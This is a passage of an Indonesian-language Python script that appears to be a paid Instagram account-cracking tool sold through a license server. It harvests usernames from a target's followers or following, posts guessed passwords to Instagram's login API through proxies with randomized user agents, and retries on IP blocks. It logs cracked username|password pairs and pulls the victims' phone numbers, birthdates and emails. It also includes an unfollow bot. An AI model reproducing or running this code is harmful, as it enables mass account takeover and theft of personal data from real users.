			j=random.randrange(4200,4900)
			k=random.randrange(40,150)
			l='Mobile Safari/537.36'
			uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
			ses = requests.Session()
			url = "https://www.instagram.com/accounts/login/?force_classic_login&hl=en"
			response = ses.get(url).text
			token = re.search('name="csrfmiddlewaretoken" value="(\\w+)"/>', str(response)).group(1)
			head = {
                    'Host': 'www.instagram.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://www.instagram.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': uaku,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.instagram.com/accounts/login/?force_classic_login&hl=en',
                    'accept-language': 'en-US,en;q=0.9' }
			param={
					'csrfmiddlewaretoken': token,
					'username': user,
					'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{ncek}:{pwd}'}
			respon=ses.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", headers=head, data=param, allow_redirects=True,proxies=proxs)
			if 'href="https://www.instagram.com/?hl=id"' in str(respon.text) or 'href="https://www.instagram.com/?hl=en"' in str(respon.text):
				coki  = ";".join([key+"="+value.replace('"','') for key, value in respon.cookies.get_dict().items()])
				nomo,tanggal,email,joined=self.info(coki)
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print("")
				tree = Tree(f"\r{bc}Nama akun : {nama}{hapus}")
				tree.add(f"\r{bc}{user} | {pwd}{hapus}")
				tree.add(f"\r{bc}Pengikut : {pengikut}{hapus}")
				tree.add(f"\r{bc}Mengikuti : {mengikut}{hapus}")
				tree.add(f"\r{bc}Postingan : {postingan}{hapus}")
				tree.add(f"\r{bc}Nomor hp : {nomo}{hapus}")
				tree.add(f"\r{bc}Tanggal lahir : {tanggal}")
				tree.add(f"{bc}Email : {email}")
				tree.add(f"{bc}Akun Tahun : {joined}")
				prints(tree)
				open(f"result/success-detector-{day}.txt","a").write(f'{user}|{pwd}|{pengikut}|{mengikut}\n')
			elif 'href="https://www.instagram.com/challenge/action/"' in str(respon.text):
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print("")
				tree = Tree(f"\r{kn}{nama}{hapus}")
				tree.add(f"\r{kn}{user} | {pwd}{hapus}")
				tree.add(f"\r{kn}Pengikut : {pengikut}{hapus}")
				tree.add(f"\r{kn}Mengikuti : {mengikut}{hapus}")
				tree.add(f"\r{kn}Postingan : {postingan}{hapus}").add(f"\r{kn}User agent : {User_Agent()}{hapus}")
				prints(tree)
				open(f"result/checkpoint-detector-{day}.txt","a").write(f'{user}|{pwd}|{pengikut}|{mengikut}\n')
			elif 'ip_block' in str(respon.text):
				sys.stdout.write(f"\r[!] {C}IP DI BLOKIR ON OFF MODE PESAWAT!!                 ");sys.stdout.flush();sleep(0)
				time.sleep(5)
				self.checkAPI(user, pwd)
		#except Exception as e:print(e)
		except:
			self.checkAPI(user,pwd)

	def menu(self):
		self.logo()
		c=input(f'  {N}[•] Pilih :{C}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			mas='[!] Masukan jumlah target'
			mas1=nel(mas,style='')
			sol().print(mas1)
			m=int(input(f'{N}[•] Jumlah : {C}'))
			mas='[•] Masukan nama random untuk di searching'
			mas1=nel(mas,style='')
			sol().print(mas1)
			for i in range(m):
				i+1
				i+=1
				prints(' [!] 1 Nama = 5k User')
				nama=input(f'{N} [{i}] Masukan nama ({H}{len(internal)}{C}): ')
				name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)

		elif c in ('2','02'):
			pr='[•] CRACK DARI PENGIKUT'
			po=nel(pr,style='')
			sol().print(po)
			#massal(self)
			mas=input('  [•] Apakah anda ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print('ISI JANGAN KOSONG KENTOD!')


		elif c in ('3','03'):
			pr='[•] CRACK DARI MENGIKUTI'
			po=nel(pr,style='')
			sol().print(po)
			mas=input('  [•] Apakah anda ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print('ISI JANGAN KOSONG KENTOD!')


		elif c in ('4','04'):
			print('')
			for i in os.listdir('result'):
				print(f' [{U}>{C}] {i}')
			c=input(f'\n {CY}┣>>> Masukan nama file: {C}')
			g=open("result/%s"%(c)).read().splitlines()
			print(f'\n{CY}┣[+] Total Result {H}{len(g)}{C}')
			print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
			for s in g:
				user=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(user,pwd)
			exit(f'\n\n{K}┣[#] proses check selesai...{C}')

		elif c in ('5','05'):
			print('')
			for i in os.listdir('result'):
				print(f' [{U}>{C}] {i}')
			c=input(f'\n {U}┣>>> Masukan nama file: {C}')
			g=open("result/%s"%(c)).read().splitlines()
			xx=c.split("-")
			xc=xx[0]
			print(f'\n{K}┣[>] Total result yang di temukan [{H}{len(g)}{C}]')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				ful=s.split("|")[3]
				if xc=="checkpoint":
					print(f"""
 [{M}+{C}] {M}𝐂𝐄𝐊𝐏𝐎𝐈N𝐓{C}
  {M}|{C}
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
					""");sleep(0.05)
				else:
					print(f"""
  {H}[>]{C}{H}  𝐋𝐈𝐕𝐄 {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}
					""");sleep(0.05)
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

		elif c in ('r','R'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('e','E'):
			self.Exit()

		else:
			self.menu()
def tlisensi():
    lu()
    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6283114591358?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
    open('.lisen.txt','w').write(lisen)
    lisensi()
    
def lisensi():
	try:
		cek=open('.lisen.txt').read()
		lisensikuni.append(cek)
	except:
		tlisensi()
	device = platform()
	ses=requests.Session()
	res=ses.get("https://instagram.fulldxrmedia.xyz/check.php?key=%s&dev=%s" % (lisensikuni[0], device)).json()
	if res["status"] == "berlaku":
		if res["usage"] == "premium":
			li()
			cetak(nel('\t[green]SELAMAT LISENSI ANDA VALID[/green]'))
			time.sleep(2)
			lisensiku.append("sukses")
			login_kamu()
		else:
			lu()
			cetak(nel('\t[red]Lisensi User Trial Tidak Tersedia Untuk Script Ini!![/red]'))
			tlisensi()
	elif res["status"] ==KeyError:
		os.system('rm .lisen.txt')
	else:
		tlisensi()

def mengi(self):
			try:
				menudump.append('mengikuti')
				mas='[!] Target harus bersifat publik jangan privat'
				mas1=nel(mas,style='')
				sol().print(mas1)
				m=int(input(f'\n{N}[?{N}] Masukan jumlah target: {N}'))
			except:m=1
			for t in range(m):
				t +=1
				so=f'# TOTAL ID :{len(internal)}'
				pi=mark(so,style='green')
				sol().print(pi)
				nama=input(f' [{t}] Masukan Username : ')
				pr=f' Sedang Mengumpulkan ID : [red]{nama}[/red]'
				u=nel(pr,style="")
				sol().print(u)
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)

def meng(self):
		menudump.append('mengikuti')
		mas='[!] Target harus bersifat publik jangan privat'
		mas1=nel(mas,style='')
		sol().print(mas1)
		nama=input(f'  {N}[•] Username target : {C}')
		pr=f' Sedang Mengumpulkan ID : [red]{nama}[/red]'
		so=nel(pr,style='')
		sol().print(so)
		id=self.idAPI(self.cookie,nama)
		info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		self.passwordAPI(info)

def masal(self):
			try:
				menudump.append('pengikut')
				mas='[!] Target harus bersifat publik jangan privat'
				mas1=nel(mas,style='')
				sol().print(mas1)
				m=int(input(f'\n  {H}[?{H}] Masukan jumlah target: {N}'))
			except:m=1
			for t in range(m):
				t +=1
				so=f'# TOTAL ID :{len(internal)}'
				pi=mark(so,style='green')
				sol().print(pi)
				nama=input(f' [{t}] Masukan Username : ')
				pr=f' Sedang Mengumpulkan ID : [red]{nama}[/red]'
				u=nel(pr,style="")
				sol().print(u)
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)



def massal(self):
			menudump.append('pengikut')
			mas='[!] Target harus bersifat publik jangan privat'
			mas1=nel(mas,style='')
			sol().print(mas1)
			m=input(f'  {N}[•] Username target : {C}')
			pr=f' Sedang Mengumpulkan ID : [red]{m}[/red]'
			so=nel(pr,style="")
			sol().print(so)

			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)

if __name__=="__main__":
	lisensi()
